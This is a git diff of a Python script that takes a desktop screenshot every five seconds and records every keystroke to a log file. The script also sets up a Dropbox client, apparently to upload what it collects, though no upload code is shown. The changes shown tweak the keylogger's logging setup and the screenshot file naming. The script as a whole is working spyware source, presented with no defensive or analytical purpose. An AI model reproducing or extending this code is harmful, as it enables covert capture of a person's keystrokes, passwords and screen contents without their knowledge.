@@ -8,7 +8,6 @@ import logging
 
 
 dbx = dropbox.Dropbox('')
-logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s')
 
 def main():
     threading.Timer(5.0, main).start()
@@ -20,13 +19,12 @@ def main():
 def grab_desktop_image():
     im=ImageGrab.grab()
     dt = datetime.now()
-    fname = "pic_{}.{}.png".format(dt.strftime("%H%M_%S"), dt.microsecond // 100000)
+    fname = str(dt) + '.png'
     im.save(fname, 'png')
-    print(fname)
     return fname
 
 def logger():
-
+    logging.basicConfig(filename=("log.txt"), level=logging.INFO, format= '%(asctime)s: %(message)s')
     def on_press(key):
         logging.info(key)
 
